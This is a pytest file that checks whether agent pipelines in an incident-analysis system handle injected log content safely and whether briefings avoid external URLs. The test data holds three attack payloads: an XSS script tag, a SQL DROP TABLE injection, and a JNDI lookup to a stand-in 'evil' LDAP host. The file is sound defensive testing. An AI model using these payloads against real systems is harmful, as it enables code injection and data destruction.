"""Cross-cutting security-style checks for agent outputs (injection / exfiltration patterns)."""

from __future__ import annotations

from pathlib import Path

import pytest

from mas.agents.briefing.pipeline import run_briefing_pipeline
from mas.agents.correlation.pipeline import run_correlation_pipeline
from mas.agents.ingest.pipeline import run_ingest_pipeline
from mas.agents.rca.pipeline import run_rca_pipeline


@pytest.mark.parametrize(
    "injection",
    [
        "<script>alert(1)</script>",
        "'; DROP TABLE incidents;--",
        "${jndi:ldap://evil}",
    ],
)
def test_correlation_output_does_not_echo_raw_injection_as_success(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    injection: str,
) -> None:
    """Correlation markdown should not treat injection strings as successful DB rows by default."""
    monkeypatch.setenv("OLLAMA_SKIP", "1")
    base = tmp_path / "corr"
    base.mkdir()
    log = base / "x.log"
    log.write_text(f"ERROR {injection}\n", encoding="utf-8")
    monkeypatch.setenv("MAS_INGEST_ALLOWED_ROOTS", str(base))
    ingest = run_ingest_pipeline(file_paths=[str(log)], use_ollama=False)
    text = ingest.to_state_string()
    report = run_correlation_pipeline(ingest_findings=text, db_path=None)
    out = report.to_state_string()
    # Should still produce structured markdown; not crash
    assert "Correlation findings" in out


def test_briefing_does_not_require_external_urls(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("OLLAMA_SKIP", "1")
    report = run_briefing_pipeline(
        ingest_findings="ERROR 503",
        correlation_findings="- Class: `UPSTREAM_OUTAGE`",
        rca_hypotheses="#### 1. Test\n- Verify metrics",
        use_ollama=False,
    )
    md = report.to_state_string()
    assert "http://" not in md.lower() and "https://" not in md.lower()
